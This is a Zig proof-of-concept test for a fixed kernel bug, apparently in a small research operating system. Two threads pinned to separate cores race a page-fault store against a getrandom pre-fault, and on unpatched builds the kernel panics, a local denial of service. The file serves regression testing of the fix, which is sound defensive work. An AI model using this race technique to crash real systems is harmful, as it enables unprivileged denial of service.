// PoC for c347ea8: racy pre-check panic in user page fault handler.
//
// Pre-patch: handlePageFault, after demand-region lookup but before
// calling vmm.demandPage, ran:
//
//     const page_base = ...alignBackward(faulting_virt, PAGE4K);
//     if (arch.resolveVaddr(proc.addr_space_root, page_base) != null) {
//         @panic("user fault on already-mapped page");
//     }
//
// The check ran without vmm.lock. A concurrent syscall pre-fault on
// another CPU (sysGetrandom -> proc.vmm.demandPage) could install the
// PTE between the hardware raising #PF and us reaching the resolveVaddr
// call. The check then observes the now-present PTE and panics — an
// unprivileged two-thread process kernel DoS.
//
// Post-patch: the pre-check is gone. demandPage takes vmm.lock and has
// an "already backed" fast path, so the benign race is a silent no-op
// and the faulting instruction simply retries.
//
// PoC strategy:
//   * Reserve N=512 fresh private R/W pages (no PTEs installed).
//   * Pin the attacker (this) thread to core 0 and a helper thread
//     to core 1 via set_affinity.
//   * For each page i, both threads barrier on a futex pair, then:
//       core 0: store to pages[i] -> CPU raises #PF on a fresh page.
//       core 1: getrandom(pages[i], 8) -> sysGetrandom calls
//               proc.vmm.demandPage on the same page.
//     With the threads released simultaneously across CPUs the two
//     events overlap on a substantial fraction of the 512 iterations.
//   * Pre-patch: one of the iterations races inside handlePageFault,
//     resolveVaddr returns non-null after the pre-fault wins, kernel
//     panics. No POC line printed; harness reports VULNERABLE from the
//     missing PATCHED marker / panic banner on serial.
//   * Post-patch: every iteration completes; PATCHED line is printed.
//
// Differential signal:
//   PATCHED    -> "POC-c347ea8: PATCHED" line printed after all rounds.
//   VULNERABLE -> kernel panic ("user fault on already-mapped page"),
//                 no shutdown, no POC line.

const lib = @import("lib");
const syscall = lib.syscall;
const perms = lib.perms;

const PAGE4K: u64 = 4096;
const NUM_PAGES: u64 = 512;
const REGION_BYTES: u64 = NUM_PAGES * PAGE4K;

// Per-iteration barrier: each iteration increments `gate` from 0 -> 1
// (helper waiting) and from 1 -> 2 (helper finished). Atomicity is via
// the futex syscall semantics — we only need the values to be observed
// across cores in order, which the kernel futex guarantees.
var gate: u64 align(8) = 0;
var iter: u64 align(8) = 0;
var done: u64 align(8) = 0;

// Pointer to the reserved region, populated before the helper starts.
var region_base: u64 = 0;

fn helperEntry() void {
    // Pin the helper to core 1. The attacker is on core 0; using
    // distinct physical cores is what makes the page-fault hardware
    // path overlap with the demandPage syscall path.
    _ = syscall.set_affinity(0b0010);

    var i: u64 = 0;
    while (i < NUM_PAGES) {
        // Wait for the attacker to publish the next iteration index.
        // The attacker bumps `iter` to `i + 1` right before its store.
        while (@atomicLoad(u64, &iter, .acquire) <= i) {
            _ = syscall.thread_yield();
        }

        const page_va = region_base + i * PAGE4K;
        // sysGetrandom takes a user VA, calls vmm.demandPage(write=true)
        // unconditionally, then resolves the PTE and writes 8 bytes.
        // Exactly the pre-fault path that the removed check tripped on.
        _ = syscall.getrandom_raw(page_va, 8);

        i += 1;
    }
    @atomicStore(u64, &done, 1, .release);
    _ = syscall.futex_wake(&done, 1);
    syscall.thread_exit();
}

pub fn main(_: u64) void {
    // Reserve 512 fresh private pages with read+write rights. These
    // start with no PTEs installed; touching one raises #PF and walks
    // the demand-page handler we are racing.
    const rights = (perms.VmReservationRights{ .read = true, .write = true }).bits();
    const r = syscall.mem_reserve(0, REGION_BYTES, rights);
    if (r.val < 0) {
        syscall.write("POC-c347ea8: mem_reserve failed\n");
        syscall.shutdown();
    }
    region_base = r.val2;

    // Pin attacker to core 0 so the helper (core 1) is on a real
    // sibling CPU. set_affinity returning non-zero means we lack
    // ProcessRights.set_affinity; root_service has it by default.
    if (syscall.set_affinity(0b0001) != 0) {
        syscall.write("POC-c347ea8: set_affinity(core0) failed\n");
        syscall.shutdown();
    }

    // Spawn the helper thread.
    const th = syscall.thread_create(helperEntry, 0, 4);
    if (th < 0) {
        syscall.write("POC-c347ea8: thread_create failed\n");
        syscall.shutdown();
    }

    // Race loop. For each fresh page, publish the iteration index
    // (helper is spinning on it) and immediately store to the page.
    // With the helper on core 1 spinning on `iter`, its getrandom
    // syscall lands within a few hundred cycles of our store — well
    // inside the #PF handler's pre-check window pre-patch.
    var i: u64 = 0;
    while (i < NUM_PAGES) {
        @atomicStore(u64, &iter, i + 1, .release);

        // The store. On a fresh page this raises #PF, which on the
        // unpatched kernel calls handlePageFault -> resolveVaddr after
        // the helper's demandPage may have already installed the PTE.
        const ptr: *volatile u64 = @ptrFromInt(region_base + i * PAGE4K);
        ptr.* = i;

        i += 1;
    }

    // Wait for helper to finish.
    while (@atomicLoad(u64, &done, .acquire) == 0) {
        _ = syscall.futex_wait(&done, 0, 1_000_000_000);
    }

    syscall.write("POC-c347ea8: PATCHED (fault/pre-fault race survived)\n");
    syscall.shutdown();
}
